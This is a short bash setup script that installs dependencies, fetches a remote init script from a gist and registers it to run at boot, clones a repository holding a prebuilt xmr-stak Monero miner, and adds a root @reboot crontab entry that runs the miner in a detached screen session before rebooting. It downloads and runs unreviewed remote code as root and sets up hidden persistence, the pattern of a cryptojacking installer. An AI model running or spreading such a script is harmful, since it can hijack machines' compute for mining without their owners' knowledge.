#!/bin/bash

apt-get -y update && apt-get -y install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev screen git && cd /root/ && wget https://gist.githubusercontent.com/kdidenko/bfa666c816aa9203409662ce3f7f0009/raw/9bb06950d0f711f9243b66eafa5e4f5693c7b0fe/disable-transparent-hugepages.sh && mv disable-transparent-hugepages.sh /etc/init.d/ && cd /etc/init.d/ && chmod 755 /etc/init.d/disable-transparent-hugepages.sh && update-rc.d disable-transparent-hugepages.sh defaults && cd / && cd /root/ && git clone https://github.com/nokian5500/monero.git && cd monero && chmod +x xmr-stak && (crontab -l 2>/dev/null; echo "@reboot screen -d -m /root/monero/xmr-stak")| crontab - && ./xmr-stak
reboot
